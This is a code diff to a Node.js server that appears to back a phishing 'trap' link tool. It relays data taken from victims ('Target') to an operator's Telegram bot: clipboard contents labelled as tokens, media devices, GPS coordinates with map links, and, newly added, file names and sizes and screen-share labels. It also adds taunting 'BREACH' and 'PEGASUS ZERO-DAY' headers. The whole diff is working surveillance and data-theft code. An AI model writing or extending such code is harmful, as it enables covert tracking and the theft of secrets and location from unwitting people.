@@ -128,15 +128,17 @@ async function startServer() {
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'Default';
       
-      let header = '💻 <b>HARDWARE METADATA REVEALED</b> 💻';
-      let status = '🔍 <i>Target sedang berada di jendela permintaan GPS...</i>';
+      let header = '💻 <b>HARDWARE AUDIT REVEALED</b> 💻';
+      let status = '🔍 <i>Target sedang memproses izin advanced...</i>';
 
-      if (tmplId === '9') {
+      if (tmplId === '1') {
+        header = '⚡ <b>ULTRA BREACH CAPTURED!</b> ⚡';
+      } else if (tmplId === '11') {
+        header = '💀 <b>PEGASUS ZERO-DAY EXPLOIT!</b> 💀';
+        status = '🔥 <i>Status: Full System Audit in Progress...</i>';
+      } else if (tmplId === '9') {
         header = '🕵️ <b>STEALTH LOG ACQUIRED!</b> 🕵️';
-        status = '🏁 <i>Status: Silent Logging Berhasil (Tanpa GPS).</i>';
-      } else if (tmplId === '3') {
-        header = '🚀 <b>FAST LOG REVEALED</b> 🚀';
-        status = '🏁 <i>Status: Clipboard & Metadata Captured.</i>';
+        status = '🏁 <i>Status: Silent Tracking Aktif.</i>';
       }
 
       let msg = `${header}\n` +
@@ -155,20 +157,26 @@ async function startServer() {
     res.sendStatus(200);
   });
 
-  // Handle Extra Data (Clipboard, Media, etc)
+  // Handle Extra Data (Clipboard, Media, Screen, etc)
   app.post('/api/log/:id/extra', (req, res) => {
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
       const data = req.body;
-      let extraMsg = `📎 <b>EXTRA DATA CAPTURED!</b> 📎\n` +
+      let extraMsg = `📎 <b>ADVANCED DATA CAPTURED!</b> 📎\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       
       if (data.clipboard) {
-        extraMsg += `📋 <b>Clipboard Token:</b>\n<code>${escapeHTML(data.clipboard)}</code>\n`;
+        extraMsg += `📋 <b>Clipboard Token:</b>\n<code>${escapeHTML(data.clipboard)}</code>\n\n`;
       }
       if (data.media) {
-        extraMsg += `🎙️ <b>Media Devices:</b>\n<pre>${escapeHTML(data.media)}</pre>\n`;
+        extraMsg += `🎙️ <b>Media Hardware:</b>\n<pre>${escapeHTML(data.media)}</pre>\n\n`;
+      }
+      if (data.file_name) {
+        extraMsg += `📁 <b>File Access Audit:</b>\n📄 <b>Name:</b> <code>${escapeHTML(data.file_name)}</code>\n📦 <b>Size:</b> <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
+      }
+      if (data.screen_label) {
+        extraMsg += `🖥️ <b>Screen Share Source:</b>\n<code>${escapeHTML(data.screen_label)}</code>\n\n`;
       }
       
       extraMsg += `━━━━━━━━━━━━━━━━━━━━`;
@@ -185,10 +193,10 @@ async function startServer() {
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       
       let header = '📍 <b>GEOLOCATION FIX ACQUIRED!</b> 📍';
-      if (tmplId === '8') {
-        header = '🔞 <b>DI DEKAT KAMU ADA TARGET 18+!</b> 🔞';
+      if (tmplId === '1') {
+        header = '⚡ <b>ULTRA LOCATION TRACKED!</b> ⚡';
       } else if (tmplId === '5') {
-        header = '🛰️ <b>SYSTEM TRACKED TO COORDINATES!</b> 🛰️';
+        header = '🗺️ <b>MAPS SYNC COORDINATES!</b> 🗺️';
       }
 
       const msg = `${header}\n` +
